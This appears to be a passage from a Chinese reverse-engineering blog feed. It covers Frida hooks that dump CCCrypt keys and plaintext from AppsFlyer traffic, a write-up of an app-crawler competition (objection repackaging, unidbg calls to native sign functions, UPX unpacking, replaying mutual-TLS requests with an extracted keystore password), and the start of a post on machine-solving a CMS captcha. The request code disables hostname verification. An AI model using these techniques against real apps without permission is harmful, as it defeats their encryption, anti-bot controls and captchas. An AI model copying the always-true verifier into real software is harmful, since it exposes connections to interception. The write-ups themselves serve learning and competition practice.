class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  onEnter: <span class="function"><span class="keyword">function</span> (<span class="params">log, args, state</span>) </span>&#123;</span><br><span class="line">    log(<span class="string">'CCCrypt('</span> +</span><br><span class="line">        <span class="string">'op='</span> + args[<span class="number">0</span>] +</span><br><span class="line">        <span class="string">', alg='</span> + args[<span class="number">1</span>] +</span><br><span class="line">        <span class="string">', options='</span> + args[<span class="number">2</span>] +</span><br><span class="line">        <span class="string">', key='</span> + args[<span class="number">3</span>] +</span><br><span class="line">        <span class="string">', keyLength='</span> + args[<span class="number">4</span>] +</span><br><span class="line">        <span class="string">', iv='</span> + args[<span class="number">5</span>] +</span><br><span class="line">        <span class="string">', dataIn='</span> + args[<span class="number">6</span>] +</span><br><span class="line">        <span class="string">', dataInLength='</span> + args[<span class="number">7</span>] +</span><br><span class="line">        <span class="string">', dataOut='</span> + args[<span class="number">8</span>] +</span><br><span class="line">        <span class="string">', dataOutAvailable='</span> + args[<span class="number">9</span>] +</span><br><span class="line">        <span class="string">', dataOutMoved='</span> + args[<span class="number">10</span>] +</span><br><span class="line">        <span class="string">')'</span>);</span><br><span class="line">    <span class="comment">//保存参数</span></span><br><span class="line">    <span class="keyword">this</span>.operation   = args[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">this</span>.CCAlgorithm = args[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">this</span>.CCOptions   = args[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">this</span>.keyBytes    = args[<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">this</span>.keyLength   = args[<span class="number">4</span>]</span><br><span class="line">    <span class="keyword">this</span>.ivBuffer    = args[<span class="number">5</span>]</span><br><span class="line">    <span class="keyword">this</span>.inBuffer    = args[<span class="number">6</span>]</span><br><span class="line">    <span class="keyword">this</span>.inLength    = args[<span class="number">7</span>]</span><br><span class="line">    <span class="keyword">this</span>.outBuffer   = args[<span class="number">8</span>]</span><br><span class="line">    <span class="keyword">this</span>.outLength   = args[<span class="number">9</span>]</span><br><span class="line">    <span class="keyword">this</span>.outCountPtr = args[<span class="number">10</span>]</span><br><span class="line">    <span class="comment">//this.operation == 0 代表是加密</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.operation == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="comment">//打印加密前的原文</span></span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">"In buffer:"</span>)</span><br><span class="line">      <span class="built_in">console</span>.log(hexdump(ptr(<span class="keyword">this</span>.inBuffer), &#123;</span><br><span class="line">        length: <span class="keyword">this</span>.inLength.toInt32(),</span><br><span class="line">        header: <span class="literal">true</span>,</span><br><span class="line">        ansi: <span class="literal">true</span></span><br><span class="line">      &#125;))</span><br><span class="line">      <span class="comment">//打印密钥</span></span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">"Key: "</span>)</span><br><span class="line">      <span class="built_in">console</span>.log(hexdump(ptr(<span class="keyword">this</span>.keyBytes), &#123;</span><br><span class="line">        length: <span class="keyword">this</span>.keyLength.toInt32(),</span><br><span class="line">        header: <span class="literal">true</span>,</span><br><span class="line">        ansi: <span class="literal">true</span></span><br><span class="line">      &#125;))</span><br><span class="line">      <span class="comment">//打印 IV</span></span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">"IV: "</span>)</span><br><span class="line">      <span class="built_in">console</span>.log(hexdump(ptr(<span class="keyword">this</span>.ivBuffer), &#123;</span><br><span class="line">        length: <span class="keyword">this</span>.keyLength.toInt32(),</span><br><span class="line">        header: <span class="literal">true</span>,</span><br><span class="line">        ansi: <span class="literal">true</span></span><br><span class="line">      &#125;))</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  onLeave: <span class="function"><span class="keyword">function</span> (<span class="params">log, retval, state</span>) </span>&#123;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>效果如下：<br><img src="1665587977491.png" alt="image.png"><br>也是可以进行加密数据的解析。</p><h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><p>本文主要涉及部分内容，一是ios APP签名，另外就是加密函数<code>CCCrypt</code>。该函数是IOS加密中常用的函数，在分析的时候可以直接使用<code>frida-trace -U -f xxxx -i CCCrypt</code>来查看加密是否调用了该函数，然后进行数据解密。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;前段时间有这样一个需求，需要抓一下IOS端下appsflyer这个平台的数据，于是就帮忙看了一下。这里其实和APP没多大关系，需要接入appsflyer这个平台的APP就可以，然后将抓包获取的加密数据进行解密。&lt;/p&gt;
    
    </summary>
    
    
      <category term="IOS逆向" scheme="https://fuping.site/categories/IOS%E9%80%86%E5%90%91/"/>
    
    
      <category term="frida" scheme="https://fuping.site/tags/frida/"/>
    
      <category term="appsflyer" scheme="https://fuping.site/tags/appsflyer/"/>
    
      <category term="CCCrypt" scheme="https://fuping.site/tags/CCCrypt/"/>
    
  </entry>
  
  <entry>
    <title>记一次APP爬虫比赛</title>
    <link href="https://fuping.site/2022/07/07/YRX-APP-MATCH/"/>
    <id>https://fuping.site/2022/07/07/YRX-APP-MATCH/</id>
    <published>2022-07-07T00:30:00.000Z</published>
    <updated>2022-10-21T00:58:22.599Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>5月中旬的时候，猿人学举行了一个APP爬虫大赛，共设10题，主要涉及Android反混淆，双向认证，tls指纹对抗等技术。而且只需要答对一题就有参与奖，即可获得一件猿人学定制T恤。另外第一题不涉及so，仅涉及java层加密。为了T恤，立马去报了名参赛。</p><a id="more"></a><h2 id="0x02答题"><a href="#0x02答题" class="headerlink" title="0x02答题"></a>0x02答题</h2><p>比赛开始的时候，想着下载完APP，然后冲完第一题就完事，但结果发现APP安装都成问题。<br><img src="YRX-01.png" alt="YRX-01.png"></p><p>查看规则才知道，参赛的APP只支持arm64架构的手机，我的<code>Nexus 5</code>根本不支持。还好身边有一个marry大佬尊贵的荣耀8，成功安装了APP。<br><img src="YRX-02.png" alt="YRX-02.png"><br>但是又出现了另外的问题，由于手机是安卓版本8.0，也没有root，配置完代理无法抓到该程序的包。对于未root抓包的话，也有很多其他的解决方法，例如可以使用<code>VMOS Pro</code>，也可以使用<code>VirtualXposed</code>结合xposed插件来抓包，或者利用<code>objection</code>重新打包，之后就可以使用<code>objection</code>来进行测试。<br>实际上不用抓包也是可以做出几道题的，需要搞清楚请求的参数即可，首先来看第一题。</p><h3 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h3><p>虽说第一题不涉及so，仅包含java层的加密，但这道题做起来也有一点麻烦，需要抠代码和修改。首先来看一下题目：<br><img src="YRX-03.png" alt="YRX-03.png"><br>10道题都是要爬取1-100页之间的数据，然后求和。<br>由于APP没有加壳，所以可以直接使用jadx来打开，可以看到代码进行了混淆。</p><blockquote><p>使用<code>adb shell dumpsys activity top</code>来找到当前打开的界面，从而定位到<code>com.yuanrenxue.match2022.fragment.challenge.ChallengeOneFragment</code></p></blockquote><p>进入到<code>com.yuanrenxue.match2022.fragment.challenge.ChallengeOneFragment</code>中。</p><p><img src="YRX-04.png" alt="YRX-04.png"><br>可以很容易就发现加密的关键点，调用了<code>com.yuanrenxue.match2022.security.Sign</code>的sign方法对一些参数进行了加密。这里sign方法传入的参数是<code>sb.toString().getBytes(StandardCharsets.UTF_8)</code>，而<code>sb</code>可以从上面获取。主要代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">StringBuilder sb = <span class="keyword">new</span> StringBuilder();  </span><br><span class="line">       sb.append(<span class="string">"page="</span>);  </span><br><span class="line">       sb.append(<span class="keyword">this</span>.page);  </span><br><span class="line">       <span class="keyword">long</span> longValue = c3756OooOO0O.OooO00o().longValue();  </span><br><span class="line">       sb.append(longValue);</span><br></pre></td></tr></table></figure><p>由代码可以看出，<code>sb.toString()</code>的内容就是<code>page=</code>拼接当前页码，和当前时间戳组成的。<br><img src="YRX-05.png" alt="YRX-05.png"><br>进入到<code>o0O0ooO.AbstractC4864OooO0O0</code>的<code>OooO00o</code>方法。<br><img src="YRX-06.png" alt="YRX-06.png"><br>可以发现http请求的接口和参数，经过拼接后请求的url是<code>https://appmatch.yuanrenxue.com/app1</code>，参数一共有3个。分别为当前页码<code>page</code>、加密结果<code>sign</code>以及时间戳<code>t</code>，重点看一下如何加密获取sign值的。</p><blockquote><p>使用抓包的话很容易就定位到这里，当时没有抓包，经过尝试也是可以获取到请求的URL。</p></blockquote><p>进入<code>com.yuanrenxue.match2022.security.Sign.sign</code>方法，这里推荐用idea打开，可以少走一些弯路。可以对比看一下jadx和idea打开的效果，这里就不放图了。下面是使用idea打开的效果：<br><img src="YRX-07.png" alt="YRX-07.png"><br>从群里发现有老师傅发出抓包请求的内容，刚好可以供我们进行测试。请求的内容:<code>page=1&amp;sign=837056ab8650736b103f193d95ebbc3c&amp;t=1652444336</code>，看起来sign像是md5，经验证发现并不是。如果直接调用反编译后的<code>new com.yuanrenxue.match2022.security.Sign().sign()</code>方法，结果也是不正确的。<br><img src="YRX-08.png" alt="YRX-08.png"><br>主要原因可能是因为这些内容是反编译过来的，有些内容可能有所变动。这里的思路是把用到的方法拎出来，然后进行修改。扒完之后一共有这几个文件：<br><img src="YRX-09.png" alt="YRX-09.png"><br>当然运行结果也不是正确的。经过对比，用idea和jadx打开的<code>f</code>方法内容是不一样的：<br><img src="YRX-10.png" alt="YRX-10.png"><br>将内容修改后，可以成功获取到正确的sign值。<br><img src="YRX-11.png" alt="YRX-11.png"></p><p>剩下的就简单了，请求1-100页，获取到每页的数据然后求和。这里仅演示获取第一页的数值。<br><img src="YRX-12.png" alt="YRX-12.png"></p><p>做完了第一题后又看了一下其他的题，发现第二题、第三题、第八题通过使用<code>unidbg</code>可以很直接的得出结果，第五题采用了双向证书，直接抠代码也是可以做出来。第二题、第三题、第八题做题思路一样，所以放一起来说，最后再说第五题。</p><h3 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h3><p>第二题就涉及到了so，这不禁令人头大。搞了好久so文件才发现规则中允许使用<code>unidbg</code>，用其调用so的话简单快捷。这里没有好兄弟发请求的数据了，只能自己动手抓包了。<br>由于要对app进行抓包和hook查看参数，因此<code>objection</code>将<code>frida-gadget.so</code>打包进apk中，使用命令为：<br><code>objection patchapk --source yuanrenxuem106.apk</code>。<br>然后就可以利用    <code>objection</code>对app进行分析了。<br><img src="YRX-13.png" alt="YRX-13.png"><br>通过查看反编译后的代码，第二题的话请求一共有3个参数:<code>page</code>、<code>ts</code>、<code>sign</code>，<code>page</code>是页码，<code>ts</code>是时间戳，<code>sign</code>是加密的内容。<br><img src="YRX-14.png" alt="YRX-14.png"><br>可以看到sign是经过了调用so的加密结果，使用<code>objection</code>查看加密传入的参数。<br><code>android hooking watch class_method com.yuanrenxue.match2022.fragment.challenge.ChallengeTwoFragment.sign --dump-args</code><br><img src="YRX-15.png" alt="YRX-15.png"><br>传入的参数是由<code>page</code>和<code>ts</code>进行了拼接，中间由<code>:</code>连接。知道了调用so的传入的参数，下面就开始用unidbg进行调用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ChallengeTwoFragment</span> <span class="keyword">extends</span> <span class="title">AbstractJni</span> </span>&#123;  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> AndroidEmulator emulator;  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> VM vm;  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Memory memory;  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Module <span class="keyword">module</span>;  </span><br><span class="line">  </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ChallengeTwoFragment</span><span class="params">()</span> </span>&#123;  </span><br><span class="line">        emulator = AndroidEmulatorBuilder  </span><br><span class="line">                .for64Bit()  </span><br><span class="line">                .addBackendFactory(<span class="keyword">new</span> DynarmicFactory(<span class="keyword">true</span>))  </span><br><span class="line">                .build();  </span><br><span class="line">        memory = emulator.getMemory();  </span><br><span class="line">        memory.setLibraryResolver(<span class="keyword">new</span> AndroidResolver(<span class="number">23</span>));  </span><br><span class="line">        vm = emulator.createDalvikVM(<span class="keyword">new</span> File(<span class="string">"file/app/yuanrenxuem106.apk"</span>));  </span><br><span class="line">        vm.setDvmClassFactory(<span class="keyword">new</span> ProxyClassFactory());  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">// 加载so到虚拟内存  </span></span><br><span class="line">        DalvikModule dm = vm.loadLibrary(<span class="string">"match02"</span>, <span class="keyword">true</span>);  </span><br><span class="line">        <span class="keyword">module</span> = dm.getModule();  </span><br><span class="line">        vm.callJNI_OnLoad(emulator, <span class="keyword">module</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">callSign</span><span class="params">(String data)</span> </span>&#123;<span class="comment">//通过符号  </span></span><br><span class="line">        DvmObject&lt;?&gt; object = ProxyDvmObject.createObject(vm, <span class="keyword">this</span>);  </span><br><span class="line">        DvmObject&lt;?&gt; dvmObject = object.callJniMethodObject(emulator, <span class="string">"sign(java/lang/String;)java/lang/String;"</span>, data);  </span><br><span class="line">        String result = (String) dvmObject.getValue();  </span><br><span class="line">        <span class="keyword">return</span> result;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>unidbg调用so很简单，直接根据demo修改一下就行，需要注意的是要启动64位的模拟器。获取第一页的数据：<br><img src="YRX-16.png" alt="YRX-16.png"></p><h3 id="第三题"><a href="#第三题" class="headerlink" title="第三题"></a>第三题</h3><p>第三题的话和第二题类似，so文件虽然进行了加密混淆，但是可以直接使用unidbg来调用so文件。<br>首先找到第三题的请求参数，一共两个参数<code>page</code>和<code>m</code>。<br><img src="YRX-17.png" alt="YRX-17.png"><br>参数<code>m</code>的值是通过<code>crypto</code>来进行加密的，一共两个参数，类型分别为<code>String</code>和<code>long</code>。<br><img src="YRX-18.png" alt="YRX-18.png"><br>查看一下传入的两个参数内容，使用命令：<br><code>android hooking watch class_method com.yuanrenxue.match2022.fragment.challenge.ChallengeThreeFragment.crypto --dump-args</code><br><img src="YRX-19.png" alt="YRX-19.png"><br>发现第一个参数是页码与时间戳乘以1000来进行拼接的，同时如果页码长度不为3时，需要前面补零，第二个参数为时间戳乘以1000。<br>第三题和第二题是同样的套路，直接修改一下就可以使用，主要代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">callCrypto</span><span class="params">(String data,<span class="keyword">long</span> l)</span> </span>&#123;<span class="comment">//通过符号  </span></span><br><span class="line">    DvmObject&lt;?&gt; object = ProxyDvmObject.createObject(vm, <span class="keyword">this</span>);  </span><br><span class="line">    DvmObject&lt;?&gt; dvmObject = object.callJniMethodObject(emulator, <span class="string">"crypto(Ljava/lang/String;J)Ljava/lang/String;"</span>, data,l);  </span><br><span class="line">    String result = (String) dvmObject.getValue();  </span><br><span class="line">    <span class="keyword">return</span> result;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获取第一页的数据：<br><img src="YRX-20.png" alt="YRX-20.png"></p><h3 id="第八题"><a href="#第八题" class="headerlink" title="第八题"></a>第八题</h3><p>第八题与第二题、第三题都是类似的，只不过是so多加了一层upx壳，脱壳后可以通过unidbg来调用。<br>脱壳命令：<code>upx -d libmatch08.so</code><br><img src="YRX-21.png" alt="YRX-21.png"><br>查看第八题的参数，发现只有一个参数<code>s</code>。<br><img src="YRX-22.png" alt="YRX-22.png"><br>通过分析参数<code>s</code>是调用native层的<code>data</code>方法来进行加密的，传入的是页码。<br><img src="YRX-23.png" alt="YRX-23.png"><br>通过objection来验证一下：<br><code>android hooking watch class_method com.yuanrenxue.match2022.fragment.challenge.ChallengeEightFragment.data --dump-args --dump-return</code><br><img src="YRX-24.png" alt="YRX-24.png"><br>发现<code>data</code>方法传入的就是页码，然后使用unidbg来直接调用so文件，主要代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">callData</span><span class="params">(<span class="keyword">int</span> i)</span> </span>&#123;<span class="comment">//通过符号  </span></span><br><span class="line">    DvmObject&lt;?&gt; object = ProxyDvmObject.createObject(vm, <span class="keyword">this</span>);  </span><br><span class="line">    DvmObject&lt;?&gt; dvmObject = object.callJniMethodObject(emulator, <span class="string">"data(I)Ljava/lang/String;"</span>, i);  </span><br><span class="line">    String result = (String) dvmObject.getValue();  </span><br><span class="line">    <span class="keyword">return</span> result;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获取第一页的数据：<br><img src="YRX-25.png" alt="YRX-25.png"></p><h3 id="第五题"><a href="#第五题" class="headerlink" title="第五题"></a>第五题</h3><p>第五题的话也不难，从网上copy一个双向证书请求的代码就可以来完成。但需要注意几点：一是请求的URL有所变化，二是要找到key，三是如果用java来写的话，要<strong>注意jdk的版本</strong>，当时就是由于jdk的版本导致当时没做出来，换了个jdk版本，立马就出来结果了。<br>首先来分析参数，可以看出来请求的路径有所变化，参数的话只有一个，就是页码<code>page</code>。<br><img src="YRX-26.png" alt="YRX-26.png"><br>通过抓包，可以看到URL也变化了：<br><img src="YRX-27.png" alt="YRX-27.png"><br>通过hook查看一下key的值：<br><code>android hooking watch class_method javax.net.ssl.KeyManagerFactory.init --dump-args</code><br><img src="YRX-28.png" alt="YRX-28.png"><br>发送请求的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">appmatch05</span><span class="params">(String url, <span class="keyword">int</span> page)</span> <span class="keyword">throws</span> IOException </span>&#123;  </span><br><span class="line">  </span><br><span class="line">        String result = <span class="keyword">null</span>;  </span><br><span class="line">  </span><br><span class="line">        InputStream[] insCerArry = <span class="keyword">new</span> InputStream[]&#123;&#125;;  </span><br><span class="line">        InputStream insJksDir = <span class="keyword">new</span> FileInputStream(<span class="string">"file/cer/clientCA.bks"</span>);  </span><br><span class="line">  </span><br><span class="line">        HttpsUtils.SSLParams sslParams = HttpsUtils.getSslSocketFactory(insCerArry, insJksDir, <span class="string">"MZ4cozY8Qu32UzGe"</span>);  </span><br><span class="line">  </span><br><span class="line">        OkHttpClient okHttpClient = <span class="keyword">new</span> OkHttpClient.Builder()</span><br><span class="line">                .hostnameVerifier(<span class="keyword">new</span> HostnameVerifier()  </span><br><span class="line">                &#123;  </span><br><span class="line">                    <span class="meta">@Override</span>  </span><br><span class="line">                    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">verify</span><span class="params">(String hostname, SSLSession session)</span>  </span></span><br><span class="line"><span class="function">                    </span>&#123;  </span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">true</span>;  </span><br><span class="line">                    &#125;  </span><br><span class="line">                &#125;)  </span><br><span class="line">                .sslSocketFactory(sslParams.sSLSocketFactory, sslParams.trustManager)  </span><br><span class="line">                .build();  </span><br><span class="line">          </span><br><span class="line">        RequestBody formBody = <span class="keyword">new</span> FormBody.Builder()  </span><br><span class="line">                .add(<span class="string">"page"</span>, page + <span class="string">""</span>)  </span><br><span class="line">                .build(); <span class="comment">// 表单键值对  </span></span><br><span class="line">        Request request = <span class="keyword">new</span> Request.Builder().url(url).post(formBody).build(); <span class="comment">// 请求  </span></span><br><span class="line">        Response response = okHttpClient.newCall(request).execute();  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> (response.isSuccessful()) &#123;  </span><br><span class="line">            result = response.body().string();  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> result;  </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>HttpsUtils网上搜索一个抄下来就可以用了。请求第一页数据：<br><img src="YRX-29.png" alt="YRX-29.png"><br>需要注意使用的java版本，使用jdk1.8.0_111时，就会爆下面的错误：<br><img src="YRX-30.png" alt="YRX-30.png"><br>当时比赛的时候用的jdk1.8.0_111，一直报错，导致找了好多关于双向证书的代码都不行，在比赛结束后，换了jdk版本同样的代码，立即就好了。</p><h2 id="0x03总结"><a href="#0x03总结" class="headerlink" title="0x03总结"></a>0x03总结</h2><p>本文主要是通过一次APP爬虫的比赛，一方面提供了对于Android 7 及以上系统抓包的一种思路，二是unidbg的初级使用，还有就是双向证书的问题。对于其他grpc、quic、tls等，还需要更深入的学习。另外还要感谢王老板提供这次学习的机会。</p><h2 id="0x04参考"><a href="#0x04参考" class="headerlink" title="0x04参考"></a>0x04参考</h2><p>[1] unidbg:<a href="https://github.com/zhkl0228/unidbg" target="_blank" rel="noopener">https://github.com/zhkl0228/unidbg</a><br>[2] objection:<a href="https://github.com/sensepost/objection/wiki/Patching-Android-Applications" target="_blank" rel="noopener">https://github.com/sensepost/objection/wiki/Patching-Android-Applications</a><br>[3] 比赛地址:<a href="http://appmatch.yuanrenxue.com/" target="_blank" rel="noopener">http://appmatch.yuanrenxue.com/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x01-前言&quot;&gt;&lt;a href=&quot;#0x01-前言&quot; class=&quot;headerlink&quot; title=&quot;0x01 前言&quot;&gt;&lt;/a&gt;0x01 前言&lt;/h2&gt;&lt;p&gt;5月中旬的时候，猿人学举行了一个APP爬虫大赛，共设10题，主要涉及Android反混淆，双向认证，tls指纹对抗等技术。而且只需要答对一题就有参与奖，即可获得一件猿人学定制T恤。另外第一题不涉及so，仅涉及java层加密。为了T恤，立马去报了名参赛。&lt;/p&gt;
    
    </summary>
    
    
      <category term="APP逆向" scheme="https://fuping.site/categories/APP%E9%80%86%E5%90%91/"/>
    
    
      <category term="猿人学" scheme="https://fuping.site/tags/%E7%8C%BF%E4%BA%BA%E5%AD%A6/"/>
    
      <category term="unidbg" scheme="https://fuping.site/tags/unidbg/"/>
    
      <category term="objection" scheme="https://fuping.site/tags/objection/"/>
    
  </entry>
  
  <entry>
    <title>记一次简单计算验证码的识别过程</title>
    <link href="https://fuping.site/2022/01/19/Calculate-Captcha-Recognition/"/>
    <id>https://fuping.site/2022/01/19/Calculate-Captcha-Recognition/</id>
    <published>2022-01-19T13:24:43.000Z</published>
    <updated>2022-10-21T00:59:09.911Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00  前言"></a>0x00  前言</h2><p>某CMS的验证码是简单的计算验证码，都是一位数的加减乘除运算，之前尝试用分割的方法识别，但成功率较低。后来采用了pytorch训练后进行识别，可以达到98%以上的识别率，于是整理一下过程，水一篇文章。</p><a id="more"></a><h2 id="0x01-验证码的获取"><a href="#0x01-验证码的获取" class="headerlink" title="0x01  验证码的获取"></a>0x01  验证码的获取</h2><p>首先是验证码的获取，由于爬取验证码还要手工标注，比较麻烦，这里可以通过修改程序来批量生成标注好的样本。</p><p>主要代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.google.code.kaptcha.Producer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GenCalculateCaptcha</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Producer kaptcha = <span class="keyword">new</span> CaptchaConfig().getKaptchaBeanMath();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">100</span>;i++)&#123;</span><br><span class="line">            String capText = kaptcha.createText();</span><br><span class="line">            String capStr = capText.substring(<span class="number">0</span>, capText.lastIndexOf(<span class="string">"@"</span>));</span><br><span class="line">            System.out.println(capStr);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">6-1&#x3D;?</span><br><span class="line">9+1&#x3D;?</span><br><span class="line">0+5&#x3D;?</span><br><span class="line">8*6&#x3D;?</span><br><span class="line">6&#x2F;1&#x3D;?</span><br><span class="line">5+7&#x3D;?</span><br><span class="line">9+3&#x3D;?</span><br><span class="line">0&#x2F;5&#x3D;?</span><br><span class="line">1*2&#x3D;?</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>通过执行的结果可以发现，生成的验证码中会出现<code>*</code>、<code>/</code>、<code>?</code>等字符，这些字符在作为文件名时不合法，所以需要进行替换。</p><p>例如将除号<code>/</code>替换为<code>÷</code>，乘号<code>*</code>替换为<code>×</code>，问号<code>?</code>替换为<code>？</code>。</p><p>同时为了避免生成的验证码重复，生成的文件名拼接了时间戳的md5，并用<code>_</code>连接。</p><p>替换的代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String newCapStr = capStr.replace(<span class="string">"/"</span>,<span class="string">"÷"</span>).replace(<span class="string">"*"</span>,<span class="string">"×"</span>).replace(<span class="string">"?"</span>,<span class="string">"？"</span>) + <span class="string">"_"</span> + DigestUtils.md5Hex(<span class="string">""</span>+System.currentTimeMillis())+<span class="string">".jpg"</span>;</span><br></pre></td></tr></table></figure><p>再次执行结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">8×4&#x3D;？_b69426246067db177639de42b77082ab.jpg</span><br><span 